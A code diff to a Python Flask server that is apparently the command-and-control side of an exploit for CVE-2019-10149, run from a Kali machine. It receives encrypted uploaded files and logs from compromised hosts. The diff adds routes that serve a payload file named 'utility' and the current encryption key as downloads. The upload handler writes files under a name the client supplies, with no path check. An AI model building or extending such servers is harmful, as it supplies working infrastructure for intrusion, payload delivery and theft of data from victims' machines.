@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_from_directory
 import base64
 import json
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -10,7 +10,7 @@ import hashlib
 
 BLOCK_SIZE = 16
 # KEY = "your_secret_key_here"  # Replace with your actual key
-key_path = "./key.txt"
+key_path = "/home/kali/Desktop/CVE-2019-10149/C2Server/cur_key.txt"
 
 def generate_key():
     key = os.urandom(BLOCK_SIZE)
@@ -103,7 +103,7 @@ def upload():
             file_data = base64.b64decode(file_data)
 
             file_name = decrypted_data["file_name"]
-            file_path = os.path.join("./receivedFiles", file_name)
+            file_path = os.path.join("/home/kali/receivedFiles", file_name)
             try:
                 with open(file_path, "wb") as f:
                     f.write(file_data)
@@ -143,6 +143,14 @@ def log():
         return jsonify({"status": "log received"}), 200
     else:
         return jsonify({"status": "no log data received"}), 400
+        
+@app.route("/utility")
+def serve_file():
+    return send_from_directory("/home/kali/Desktop/CVE-2019-10149", "utility", as_attachment=True)
+    
+@app.route("/key")
+def serve_key():
+    return send_from_directory("/home/kali/Desktop/CVE-2019-10149/C2Server", "cur_key.txt", as_attachment=True);
 
 if __name__ == '__main__':
     # Run over HTTPS with cert.pem and key.pem in the same directory.
